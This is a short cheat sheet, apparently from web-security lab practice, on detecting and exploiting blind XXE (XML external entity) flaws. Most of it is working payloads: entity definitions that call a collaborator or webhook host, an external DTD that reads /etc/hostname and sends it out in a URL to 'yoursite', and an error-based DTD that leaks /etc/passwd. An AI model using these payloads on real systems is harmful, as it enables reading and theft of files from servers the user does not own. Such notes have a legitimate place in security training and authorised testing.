## You can detect XXE vulnerability blind through making requests to another domain - this can be done with either webhooks.site or burp collaborator.


### If you find a request sending xml:  
Open collaborator/webhooks and obtain your unique url  
Insert on of the following external entity definition after the xml declaration:  
`<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://UNIQUE_URL_HERE"> ]>`  
`<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net"> ]>`  
Sometime you may need to replace a value with reference to the external entity: `&xxe;` or, at the end of your definition: `> %xxe; ]>`  
Go to your webhooks/collaborator window. You should see some DNS and HTTP interactions.  

### The next step is to weaponise the blind interaction.  
If you can host a file on the site or set one up yourself on webhooks.site, put the below in:  
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://yoursite/?x=%file;'>">
%eval;
%exfil;
```

Then call in the vuln request with:  
`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://ac981f881e87f5de8110868c012f0023.web-security-academy.net/exploit"> ]>`

### LFI from blind xxe:

as before host an xml doc somewhere:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

Trigger with:
`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://yoursite/file.xml"> %xxe;]>`
